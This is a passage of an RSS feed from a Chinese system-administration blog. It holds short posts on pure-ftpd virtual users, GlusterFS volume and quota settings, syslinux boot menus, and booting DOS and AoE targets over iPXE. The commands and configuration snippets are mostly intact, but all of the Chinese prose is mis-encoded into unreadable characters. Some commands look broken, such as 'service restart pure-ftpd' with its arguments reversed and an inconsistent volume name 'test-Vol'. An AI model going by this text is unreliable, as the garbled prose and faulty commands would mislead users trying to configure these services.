&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print &lt;span class=&#34;s2&#34;&gt;&amp;#34;From: %s - Subject: %s&amp;#34;&lt;/span&gt; %&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;em_from, subject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print &lt;span class=&#34;s2&#34;&gt;&amp;#34;-------------------------------------------------------------------------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; mes.is_multipart&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; part in mes.get_payload&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                print  quopri.decodestring&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;part.get_payload&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print quopri.decodestring&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mes.get_payload&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹virtual FTPçš„æ­å»ºpure-ftpd</title>
      <link>https://rendoumi.com/posts/20240118-pure-ftpd/</link>
      <pubDate>Thu, 18 Jan 2024 17:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-pure-ftpd/</guid>
      <description>&lt;p&gt;ç”¨è¿‡proftpdå’Œvs-ftpdï¼Œproftpdæœ‰å·¨ææ€–çš„sftpç»†ç²’åº¦æ§åˆ¶ï¼Œç‰¹æ®Šåœºåˆéå¸¸å¥½ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æ€»è§‰å¾—éƒ½å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬æ–‡ä»¶ç³»ç»Ÿçš„åº•å±‚æ˜¯GlusterFSï¼Œåœ¨ä¹‹ä¸Šå»ºç«‹è™šç”¨æˆ·ï¼Œç”¨proftpdå’Œvs-ftpdéƒ½æ„Ÿè§‰å¤æ‚ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ä¸€ç›´åœ¨æ‰¾ç®€å•çš„æ–¹æ³•ï¼Œæœ€åå‘ç°äº†pure-ftpdï¼Œå¾ˆç®€å•ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»ºä¸€ä¸ªæ— ä»»ä½•ç™»é™†æƒçš„æ–°ç”¨æˆ·ï¼Œæ³¨æ„ï¼Œuidå¿…é¡»åœ¨500ä»¥ä¸Šï¼Œä¸èƒ½ç”¨ç³»ç»Ÿç¼ºçœçš„ç”¨æˆ·ftpï¼Œåé¢æ”¹pure-ftpd.confæ—¶ä¼šæœ‰è¯´æ˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;useradd -u1000  -U -s/sbin/nologin -M ftpuser  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…pure-ftpd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install pure-ftpd  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹é…ç½®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/pure-ftpd/pure-ftpd.conf  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ChrootEveryone              yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AnonymousOnly               no  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NoAnonymous                 yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PureDB                      /etc/pure-ftpd/pureftpd.pdb  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#PAMAuthentication          yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UnixAuthentication          yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ³¨æ„ï¼Œè¿™é‡Œå°±æŒ‡å‡ºäº†æœ€å°uidï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å»ºç«‹ç”¨æˆ·çš„æ—¶å€™uidä¸èƒ½å°äº500ï¼Œå¦åˆ™pure-ftpdæ— æ³•è®¤è¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MinUID                      &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CreateHomeDir               yes  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ”¹å®Œåï¼Œæˆ‘ä»¬æ¥å¢åŠ ä¸ªç”¨æˆ·ï¼Œæ³¨æ„è¯­æ³•ï¼Œtestæ˜¯è™šæ‹Ÿç”¨æˆ·åï¼Œ-uå’Œ-gæ˜¯è™šæ‹Ÿç”¨æˆ·å¯¹åº”linuxç³»ç»Ÿçš„ç³»ç»Ÿç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥å»ºç«‹çš„é‚£ä¸ªæ— ç™»é™†æƒçš„ftpuserï¼Œ-dæ˜¯homeç›®å½•ï¼Œè¿™ä¸ªä¸ç”¨å»ºï¼Œç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†çš„æ—¶å€™pure-ftpdä¼šè‡ªåŠ¨å»ºç«‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pure-pw useradd &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -u ftpuser -g ftpuser -d /var/www/ppp  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å»ºhash&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pure-pw mkdb  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¯pure-ftpd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service restart pure-ftpd  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œæå®šäº†ï¼Œä¸€å®šè¦æ³¨æ„uidçš„é—®é¢˜ã€‚å…¶ä»–æ— å¤æ‚çš„åœ°æ–¹ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>GlusterFSçš„æ—¥å¸¸åº”ç”¨</title>
      <link>https://rendoumi.com/posts/20240118-gfs/</link>
      <pubDate>Thu, 18 Jan 2024 17:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-gfs/</guid>
      <description>&lt;p&gt;åŸºæœ¬ä¸Šæ­å»º&lt;code&gt;glusterfs&lt;/code&gt;éƒ½æ˜¯ç”¨äº†2ä¸ªå‰¯æœ¬ï¼Œç”¨æ¥ä¿è¯æ•°æ®å†—ä½™&lt;/p&gt;
&lt;p&gt;å»ºç«‹æ–°å·ï¼Œ/export/test-volç›®å½•ä¸ç”¨äº‹å…ˆå»ºç«‹ï¼Œä¼šè‡ªåŠ¨å»ºç«‹çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume create test-vol replica &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸Šå»ºç«‹æ–°å·åï¼Œtest-volçš„å±ä¸»æ˜¯rootï¼Œå¦‚æœæˆ‘ä»¬æƒ³åŸºäºgfsä¹‹ä¸Šåšä¸ªè™šæ‹Ÿçš„vsftpdï¼Œå»ºè®¾ç”¨æˆ·æ˜¯virtual.virtualï¼Œ500.500&lt;/p&gt;
&lt;p&gt;è®¾ç½®å·uid/gidå±æ€§ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol storage.owner-uid &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol storage.owner-gid &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®å·çš„quotaç©ºé—´é…é¢ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol limit-usage / 10GB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol limit-usage /path/in/volume 2G  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol features.quota-timeout &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol list  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol list /path/in/volume  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å»æ‰quotaé™åˆ¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-vol remove /  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-Vol remove /path/in/volume  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼˜åŒ–tcpå‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol diagnostics.brick-log-level WARNING  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol diagnostics.client-log-level WARNING  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol nfs.enable-ino32 on  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol nfs.addr-namelookup off  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol nfs.disable on  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol performance.cache-max-file-size 2MB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol performance.cache-refresh-timeout &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol performance.cache-size 256MB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol performance.write-behind-window-size 4M  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; test-vol performance.io-thread-count &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®å·è®¿é—®æƒé™&lt;/p&gt;</description>
    </item>
    <item>
      <title>ipxeä¸­menu.c32å’Œvesamenu.c32çš„ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_menu/</link>
      <pubDate>Thu, 18 Jan 2024 17:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_menu/</guid>
      <description>&lt;p&gt;åœ¨åšpxelinuxå¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…çš„ä¼šç”¨åˆ°èœå•é€‰é¡¹ã€‚æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œmenu.c32 å’Œ vesamenu.c32ã€‚&lt;/p&gt;
&lt;p&gt;æ•ˆæœå¦‚ä¸‹ï¼š menu.c32
&lt;img alt=&#34;image-20240118172119725&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240118-ipxe_menu/image-20240118172119725.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;vesamenu.c32
&lt;img alt=&#34;image-20240118172137015&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240118-ipxe_menu/image-20240118172137015.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŒºåˆ«å°±æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;default vesamenu.c32  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PROMPT &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NOESCAPE &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ALLOWOPTIONS &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TIMEOUT &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MENU TITLE Boot Menu
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LABEL Ghost_Client_UNDI  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MENU LABEL ^1. Ghost Client UNDI
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MENU DEFAULT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  kernel memdisk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  append keeppxe &lt;span class=&#34;nv&#34;&gt;initrd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;imz/Client_undi.imz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LABEL Ghost_Client_NDIS  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MENU LABEL ^2. Ghost Client NDIS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  kernel memdisk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  APPEND keeppxe &lt;span class=&#34;nv&#34;&gt;initrd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;imz/Client_ndis.IMZ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LABEL WinPE  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MENU LABEL ^3. WinPE 2.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KERNEL boot/pxeboot.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LABEL PartedMagic  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MENU LABEL ^4. Parted Magic
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  kernel utils/pmagic/bzImage
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LABEL Local_Drive  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; MENU LABEL ^5. Boot Local Drive
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;c1&#34;&gt;#  localboot 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; KERNEL chain.c32
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; APPEND hd0 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŒºåˆ«å°±æ˜¯ç¬¬ä¸€è¡Œ:&lt;/p&gt;</description>
    </item>
    <item>
      <title>ipxeå¯åŠ¨Dos 6.22</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_dos/</link>
      <pubDate>Thu, 18 Jan 2024 17:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_dos/</guid>
      <description>&lt;p&gt;å¤ªå¤è€çš„å‘½é¢˜äº†ï¼Œå¦‚æœæƒ³ç©Dos 6.22ä¹‹ä¸‹çš„æ¸¸æˆï¼Œé‚£å°±éœ€è¦å¼•åŠ¨ä¸€ä¸ªDosç³»ç»Ÿäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç³»ç»Ÿæ–‡ä»¶å€’æ˜¯ç°æˆçš„ï¼ŒDos6.22.imgã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•åšä¸ªipxeçš„å¯åŠ¨å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç®€å•ï¼Œä¾æ ·ç”»è‘«èŠ¦ï¼Œä¿®æ”¹boot2.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\52:54:00:7f:65:bb&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;chain http://172.16.8.1/ks/dos/memdisk\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;memdiskæ˜¯ä»syslinuxä¸­æ‹·è´çš„ï¼Œä¹Ÿæ˜¯ç¥å™¨ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®å¯ä»¥ç”¨sanbootæ¥å¯åŠ¨çš„ï¼Œä½†æ˜¯é‚£æ ·èµ·åŠ¨èµ·æ¥çš„ç³»ç»Ÿå¯¹Cç›˜æ— å†™æƒé™ï¼Œå› ä¸ºdosä¸‹æ²¡æœ‰sançš„é©±åŠ¨å¯ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ”¹ç”¨memdiskï¼Œè¿™æ ·æƒé™å˜ä¸ºå¯å†™çš„äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240118171412093&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240118-ipxe_dos/image-20240118171412093.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>ipxeä¸aoeå¯åŠ¨</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_aoe/</link>
      <pubDate>Thu, 18 Jan 2024 17:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_aoe/</guid>
      <description>&lt;p&gt;å…ˆæ™®åŠä¸€ä¸‹ï¼Œaoeï¼ˆata over ethernetï¼‰ï¼Œè·Ÿiscsiå·®ä¸å¤šï¼Œä¸è¿‡æ˜¯ç¡¬ç›˜åè®®èµ°åœ¨äº†ä»¥å¤ªç½‘ä¸Šã€‚iscsiæ˜¯3å±‚çš„åè®®ï¼Œaoeæ˜¯äºŒå±‚çš„åè®®ã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºæ˜¯äºŒå±‚çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ç½‘å…³ã€è·¯ç”±ç­‰ç­‰ï¼Œç›¸å¯¹å¼ºåˆ¶çš„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å¿…é¡»æ˜¯ä½äºåŒä¸€å­ç½‘å†…ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆè£…æœåŠ¡ç«¯vbladeï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install vblade  
